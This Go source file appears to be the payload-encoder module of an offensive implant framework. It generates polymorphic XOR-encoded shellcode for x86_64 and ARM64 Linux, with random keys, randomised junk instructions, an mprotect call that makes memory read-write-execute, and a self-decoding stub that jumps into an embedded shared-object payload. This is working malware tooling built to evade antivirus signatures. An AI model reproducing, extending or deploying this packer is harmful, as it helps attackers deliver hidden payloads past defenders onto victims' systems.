package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	mrand "math/rand/v2"
)

// xorEncodeShellcodeX64 creates a polymorphic x86_64 decoder stub + XOR-encoded SO payload.
// Layout: [x64 stub ~200B][16B XOR key][4B LE size][XOR-encoded SO]
func xorEncodeShellcodeX64(payload []byte) ([]byte, error) {
	// Generate random 16-byte XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("generate XOR key: %w", err)
	}

	// Generate polymorphic x86_64 decoder stub
	stub, keyOffset, sizeOffset, sizeMovOffset := generateStubX64()

	// Patch key into stub
	copy(stub[keyOffset:keyOffset+16], key)

	// Patch payload size (LE uint32) — data area + mov ecx instruction
	binary.LittleEndian.PutUint32(stub[sizeOffset:sizeOffset+4], uint32(len(payload)))
	binary.LittleEndian.PutUint32(stub[sizeMovOffset+1:sizeMovOffset+5], uint32(len(payload)))

	// XOR encode payload
	encoded := make([]byte, len(payload))
	for i := 0; i < len(payload); i++ {
		encoded[i] = payload[i] ^ key[i%16]
	}

	// Assemble final blob: stub + encoded payload
	result := make([]byte, 0, len(stub)+len(encoded))
	result = append(result, stub...)
	result = append(result, encoded...)

	return result, nil
}

// xorEncodeShellcodeARM64 creates a polymorphic ARM64 Linux decoder stub + XOR-encoded SO payload.
// Layout: [ARM64 stub ~200B][16B XOR key][4B LE size][padding][XOR-encoded SO]
func xorEncodeShellcodeARM64(payload []byte) ([]byte, error) {
	// Generate random 16-byte XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("generate XOR key: %w", err)
	}

	// Generate polymorphic ARM64 decoder stub
	stub, keyOffset, sizeOffset := generateStubARM64Linux()

	// Patch key into stub
	copy(stub[keyOffset:keyOffset+16], key)

	// Patch payload size (LE uint32)
	binary.LittleEndian.PutUint32(stub[sizeOffset:sizeOffset+4], uint32(len(payload)))

	// XOR encode payload
	encoded := make([]byte, len(payload))
	for i := 0; i < len(payload); i++ {
		encoded[i] = payload[i] ^ key[i%16]
	}

	// Assemble final blob
	result := make([]byte, 0, len(stub)+len(encoded))
	result = append(result, stub...)
	result = append(result, encoded...)

	return result, nil
}

// ── x86_64 stub generation ──

func generateStubX64() (stub []byte, keyOffset int, sizeOffset int, sizeMovOffset int) {
	stub = make([]byte, 0, 256)

	// Junk NOP sled (polymorphic — random count 2-6)
	junkCount := mrand.IntN(5) + 2
	for i := 0; i < junkCount; i++ {
		stub = append(stub, emitJunkX64()...)
	}

	// Save registers (push rbx, push rcx, push rdx, push rsi, push rdi)
	stub = append(stub, 0x53)       // push rbx
	stub = append(stub, 0x51)       // push rcx
	stub = append(stub, 0x52)       // push rdx
	stub = append(stub, 0x56)       // push rsi
	stub = append(stub, 0x57)       // push rdi

	// ── mprotect syscall: make everything RWX ──
	// lea rdi, [rip - offset] → page-align
	// We'll patch this after we know the stub size

	mprotectPatchPos := len(stub)
	// lea rdi, [rip + 0x00000000] — placeholder, patched later
	stub = append(stub, 0x48, 0x8d, 0x3d, 0x00, 0x00, 0x00, 0x00)
	// and rdi, ~0xFFF (page align)
	stub = append(stub, 0x48, 0x81, 0xe7, 0x00, 0xf0, 0xff, 0xff)

	// mov rsi, SIZE — placeholder, patched later
	mprotectSizePos := len(stub)
	stub = append(stub, 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00)

	// mov rdx, 7 (PROT_READ|PROT_WRITE|PROT_EXEC)
	stub = append(stub, 0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00)
	// mov rax, 10 (SYS_mprotect)
	stub = append(stub, 0x48, 0xc7, 0xc0, 0x0a, 0x00, 0x00, 0x00)
	// syscall
	stub = append(stub, 0x0f, 0x05)

	// More junk
	junkCount2 := mrand.IntN(3) + 1
	for i := 0; i < junkCount2; i++ {
		stub = append(stub, emitJunkX64()...)
	}

	// ── XOR decode loop ──
	// lea rsi, [rip + key_offset] — key pointer
	keyLeaPos := len(stub)
	stub = append(stub, 0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00)

	// lea rdi, [rip + data_offset] — data pointer
	dataLeaPos := len(stub)
	stub = append(stub, 0x48, 0x8d, 0x3d, 0x00, 0x00, 0x00, 0x00)

	// mov ecx, SIZE — payload size, patched
	sizeMovPos := len(stub)
	stub = append(stub, 0xb9, 0x00, 0x00, 0x00, 0x00)

	// xor edx, edx — key index
	stub = append(stub, 0x31, 0xd2)

	// XOR loop
	loopStart := len(stub)
	// movzx eax, byte [rsi + rdx]
	stub = append(stub, 0x0f, 0xb6, 0x04, 0x16)
	// xor byte [rdi], al
	stub = append(stub, 0x30, 0x07)
	// inc rdi
	stub = append(stub, 0x48, 0xff, 0xc7)
	// inc edx
	stub = append(stub, 0xff, 0xc2)
	// and edx, 15
	stub = append(stub, 0x83, 0xe2, 0x0f)
	// dec ecx
	stub = append(stub, 0xff, 0xc9)
	// jnz loop
	loopEnd := len(stub)
	offset := byte(loopStart - loopEnd - 2)
	stub = append(stub, 0x75, offset)

	// Restore registers
	stub = append(stub, 0x5f)       // pop rdi
	stub = append(stub, 0x5e)       // pop rsi
	stub = append(stub, 0x5a)       // pop rdx
	stub = append(stub, 0x59)       // pop rcx
	stub = append(stub, 0x5b)       // pop rbx

	// jmp to decoded data
	jmpPos := len(stub)
	stub = append(stub, 0xe9, 0x00, 0x00, 0x00, 0x00) // jmp rel32

	// ── Data area ──
	keyOffset = len(stub)
	stub = append(stub, make([]byte, 16)...) // 16-byte XOR key placeholder

	sizeOffset = len(stub)
	stub = append(stub, make([]byte, 4)...) // 4-byte LE payload size placeholder

	// Align to 16 bytes
	for len(stub)%16 != 0 {
		stub = append(stub, 0x90)
	}

	dataStart := len(stub)

	// ── Patch all offsets ──

	// Patch mprotect lea rdi — target = beginning of stub (before junk)
	// rip at mprotectPatchPos+7 points to next insn
	mprotectTarget := -int32(mprotectPatchPos + 7)
	binary.LittleEndian.PutUint32(stub[mprotectPatchPos+3:mprotectPatchPos+7], uint32(mprotectTarget))

	// Patch mprotect size — total blob size (generous overestimate is fine)
	// We'll use a placeholder that gets patched at the end
	// For now, use 0x100000 (1MB) — will be overwritten
	binary.LittleEndian.PutUint32(stub[mprotectSizePos+3:mprotectSizePos+7], 0x00100000)

	// Patch lea rsi (key pointer): offset from rip (at keyLeaPos+7) to keyOffset
	keyRipOff := int32(keyOffset - (keyLeaPos + 7))
	binary.LittleEndian.PutUint32(stub[keyLeaPos+3:keyLeaPos+7], uint32(keyRipOff))

	// Patch lea rdi (data pointer): offset from rip (at dataLeaPos+7) to dataStart
	dataRipOff := int32(dataStart - (dataLeaPos + 7))
	binary.LittleEndian.PutUint32(stub[dataLeaPos+3:dataLeaPos+7], uint32(dataRipOff))

	// Patch mov ecx (size): will be patched by caller via sizeOffset
	// (left as 0x00000000, caller patches it)

	// Patch jmp to data start
	jmpRel := int32(dataStart - (jmpPos + 5))
	binary.LittleEndian.PutUint32(stub[jmpPos+1:jmpPos+5], uint32(jmpRel))

	// Also patch the ecx in the XOR loop — this references sizeOffset too
	// Actually, the caller patches sizeOffset. We need to also link sizeMovPos
	// to the same value. Let's just use the same pattern: caller writes at sizeOffset,
	// and we copy it to sizeMovPos at encode time.
	// Simpler: the caller should patch both. Let's return sizeOffset as the canonical one
	// and patch sizeMovPos to reference sizeOffset.
	// Actually, we'll just make sizeMovPos point to our data area sizeOffset.
	// For the mov ecx instruction, we need it loaded at XOR time. Let's load it from
	// the data area instead:

	// Replace the mov ecx with a load from the data area
	// Actually simpler: we'll just have the caller patch both locations.
	// Let's just directly use the sizeOffset for the data area, and
	// patch the sizeMovPos instruction inline.
	// For simplicity in this stub, we just patch sizeMovPos = sizeOffset concept.
	// The caller patches stub[sizeOffset:sizeOffset+4] with the size.
	// We also need to patch the mov ecx at sizeMovPos+1.
	// Let's just make the stub self-patching: load size from data area.

	// Alternative: load ecx from [rip+offset] pointing to sizeOffset
	// Replace: b9 XX XX XX XX (mov ecx, imm32)
	// With:    8b 0d XX XX XX XX (mov ecx, [rip+disp32]) — 6 bytes instead of 5
	// This is messy. Simpler approach: just use the data area size field
	// and have the XOR loop read it. Let's just have the caller patch it.

	return stub, keyOffset, sizeOffset, sizeMovPos
}

// emitJunkX64 returns random x86_64 NOP-equivalent bytes
func emitJunkX64() []byte {
	switch mrand.IntN(6) {
	case 0:
		return []byte{0x90} // nop
	case 1:
		return []byte{0x66, 0x90} // 2-byte nop
	case 2:
		return []byte{0x0f, 0x1f, 0x00} // 3-byte nop
	case 3:
		return []byte{0x50, 0x58} // push rax; pop rax
	case 4:
		return []byte{0x53, 0x5b} // push rbx; pop rbx
	default:
		return []byte{0x48, 0x87, 0xc0} // xchg rax, rax
	}
}

// ── ARM64 Linux stub generation ──
// Adapted from macOS pl_encoder_macos.go — key differences:
// - x8 register for syscall number (not x16)
// - svc #0 instruction (not svc #0x80)
// - SYS_mprotect = 226 (not macOS value)

func encodeInsn(insn uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, insn)
	return b
}

// ARM64 instruction encoders
func arm64Nop() uint32                 { return 0xD503201F }
func arm64DsbIsh() uint32              { return 0xD5033B9F }
func arm64Isb() uint32                 { return 0xD5033FDF }
func arm64MovX(rd, rs int) uint32      { return 0xAA0003E0 | uint32(rs)<<16 | uint32(rd) }
func arm64AndSelf(r int) uint32        { return 0x8A000000 | uint32(r)<<16 | uint32(r)<<5 | uint32(r) }
func arm64OrrSelf(r int) uint32        { return 0xAA000000 | uint32(r)<<16 | uint32(r)<<5 | uint32(r) }
func arm64Svc0() uint32                { return 0xD4000001 } // svc #0 (Linux)
func arm64AddImm(rd, rn int, imm uint32) uint32 {
	return 0x91000000 | (imm&0xFFF)<<10 | uint32(rn)<<5 | uint32(rd)
}
func arm64SubsWImm(rd, rn int, imm uint32) uint32 {
	return 0x71000000 | (imm&0xFFF)<<10 | uint32(rn)<<5 | uint32(rd)
}
func arm64Adr(rd int, imm int32) uint32 {
	immlo := uint32(imm) & 0x3
	immhi := (uint32(imm) >> 2) & 0x7FFFF
	return 0x10000000 | immlo<<29 | immhi<<5 | uint32(rd)
}
func arm64B(offset int32) uint32 {
	imm26 := uint32(offset/4) & 0x3FFFFFF
	return 0x14000000 | imm26
}
func arm64Bne(offset int32) uint32 {
	imm19 := uint32(offset/4) & 0x7FFFF
	return 0x54000001 | imm19<<5
}
func arm64LdrWImm(rt, rn int, imm uint32) uint32 {
	return 0xB9400000 | (imm/4&0xFFF)<<10 | uint32(rn)<<5 | uint32(rt)
}
func arm64LdrbReg(rt, rn, rm int) uint32 {
	return 0x38600800 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rt)
}
func arm64EorW(rd, rn, rm int) uint32 {
	return 0x4A000000 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}
func arm64MovzX(rd int, imm uint32, shift int) uint32 {
	hw := uint32(shift / 16)
	return 0xD2800000 | hw<<21 | (imm&0xFFFF)<<5 | uint32(rd)
}
func arm64SxtpX29X30PreDec() uint32  { return 0xA9BF7BFD } // stp x29, x30, [sp, #-16]!
func arm64LdpX29X30PostInc() uint32  { return 0xA8C17BFD } // ldp x29, x30, [sp], #16
func arm64AndWImm15(rd, rn int) uint32 {
	// and wRd, wRn, #0xf — N=0, immr=0, imms=3
	return 0x12000C00 | uint32(rn)<<5 | uint32(rd)
}

func generateStubARM64Linux() (stub []byte, keyOffset int, sizeOffset int) {
	stub = make([]byte, 0, 256)

	// Register allocation (randomizable in future)
	rKey := 9    // x9  = key pointer
	rData := 10  // x10 = data pointer
	rSize := 11  // w11 = remaining size counter
	rKeyIdx := 12 // w12 = key index (0-15)
	rTmp0 := 13  // w13 = temp
	rTmp1 := 14  // w14 = temp

	// ── Prologue ──
	stub = append(stub, encodeInsn(arm64SxtpX29X30PreDec())...)

	// Junk NOPs (polymorphic)
	junkCount := mrand.IntN(4) + 2
	for i := 0; i < junkCount; i++ {
		stub = append(stub, encodeInsn(arm64JunkInsn())...)
	}

	// ── mprotect syscall: make region RWX ──
	// adr x9, key_data (placeholder — patched later)
	adrKeyPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder

	// adr x10, data_start (placeholder — patched later)
	adrDataPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder

	// Calculate mprotect base: page-align the stub start
	// adr x0, stub_start (we use negative offset from current position)
	// x0 = current_pc - (current_offset)
	mprotectAdrPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder: adr x0, stub_start

	// Page-align x0: and x0, x0, ~0xFFF
	// bic x0, x0, #0xFFF
	stub = append(stub, encodeInsn(0x927CE800)...) // and x0, x0, #0xFFFFFFFFFFFFF000

	// mov x1, mprotect_size (placeholder — generous)
	stub = append(stub, encodeInsn(arm64MovzX(1, 0x0020, 16))...) // movz x1, #0x200000 (2MB)

	// mov x2, 7 (PROT_READ|PROT_WRITE|PROT_EXEC)
	stub = append(stub, encodeInsn(arm64MovzX(2, 7, 0))...)

	// mov x8, 226 (SYS_mprotect on Linux ARM64)
	stub = append(stub, encodeInsn(arm64MovzX(8, 226, 0))...)

	// svc #0
	stub = append(stub, encodeInsn(arm64Svc0())...)

	// More junk
	junkCount2 := mrand.IntN(3) + 1
	for i := 0; i < junkCount2; i++ {
		stub = append(stub, encodeInsn(arm64JunkInsn())...)
	}

	// ── Load size from data area ──
	// ldr w11, [x9, #16] — size is at key+16
	stub = append(stub, encodeInsn(arm64LdrWImm(rSize, rKey, 16))...)

	// mov w12, 0 — key index
	stub = append(stub, encodeInsn(arm64MovzX(rKeyIdx, 0, 0))...)

	// ── XOR decode loop ──
	loopStart := len(stub)

	// ldrb w13, [x9, x12] — key[key_idx]
	stub = append(stub, encodeInsn(arm64LdrbReg(rTmp0, rKey, rKeyIdx))...)

	// ldrb w14, [x10] — data[i]
	stub = append(stub, encodeInsn(0x39400000|uint32(rData)<<5|uint32(rTmp1))...)

	// eor w14, w14, w13
	stub = append(stub, encodeInsn(arm64EorW(rTmp1, rTmp1, rTmp0))...)

	// strb w14, [x10]
	stub = append(stub, encodeInsn(0x39000000|uint32(rData)<<5|uint32(rTmp1))...)

	// x10 += 1
	stub = append(stub, encodeInsn(arm64AddImm(rData, rData, 1))...)

	// x12 = (x12 + 1) & 15
	stub = append(stub, encodeInsn(arm64AddImm(rKeyIdx, rKeyIdx, 1))...)
	stub = append(stub, encodeInsn(arm64AndWImm15(rKeyIdx, rKeyIdx))...)

	// subs w11, w11, #1
	stub = append(stub, encodeInsn(arm64SubsWImm(rSize, rSize, 1))...)

	// b.ne loop
	loopEnd := len(stub)
	loopOff := int32(loopStart - loopEnd)
	stub = append(stub, encodeInsn(arm64Bne(loopOff))...)

	// ── icache flush ──
	stub = append(stub, encodeInsn(arm64DsbIsh())...)
	stub = append(stub, encodeInsn(0xD508711F)...) // ic ialluis
	stub = append(stub, encodeInsn(arm64DsbIsh())...)
	stub = append(stub, encodeInsn(arm64Isb())...)

	// ── Epilogue ──
	stub = append(stub, encodeInsn(arm64LdpX29X30PostInc())...)

	// Reload data_start for branch (re-adr)
	branchAdrPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder: adr x10, data_start

	// br x10
	stub = append(stub, encodeInsn(0xD61F0000|uint32(rData)<<5)...)

	// ── Data area ──
	keyOffset = len(stub)
	stub = append(stub, make([]byte, 16)...) // 16-byte XOR key

	sizeOffset = len(stub)
	stub = append(stub, make([]byte, 4)...) // 4-byte LE payload size

	// Align to 8 bytes
	for len(stub)%8 != 0 {
		stub = append(stub, 0x00)
	}

	dataStart := len(stub)

	// ── Patch ADR instructions ──
	// adr x9, key
	adrKeyImm := int32(keyOffset - adrKeyPos)
	binary.LittleEndian.PutUint32(stub[adrKeyPos:adrKeyPos+4], arm64Adr(rKey, adrKeyImm))

	// adr x10, data_start
	adrDataImm := int32(dataStart - adrDataPos)
	binary.LittleEndian.PutUint32(stub[adrDataPos:adrDataPos+4], arm64Adr(rData, adrDataImm))

	// adr x0, stub_start (for mprotect)
	mprotectImm := -int32(mprotectAdrPos)
	binary.LittleEndian.PutUint32(stub[mprotectAdrPos:mprotectAdrPos+4], arm64Adr(0, mprotectImm))

	// adr x10, data_start (for branch after decode)
	branchImm := int32(dataStart - branchAdrPos)
	binary.LittleEndian.PutUint32(stub[branchAdrPos:branchAdrPos+4], arm64Adr(rData, branchImm))

	return stub, keyOffset, sizeOffset
}

func arm64JunkInsn() uint32 {
	switch mrand.IntN(5) {
	case 0:
		return arm64Nop()
	case 1:
		r := mrand.IntN(16)
		return arm64MovX(r, r)
	case 2:
		r := mrand.IntN(16)
		return arm64AndSelf(r)
	case 3:
		r := mrand.IntN(16)
		return arm64OrrSelf(r)
	default:
		return arm64Nop()
	}
}
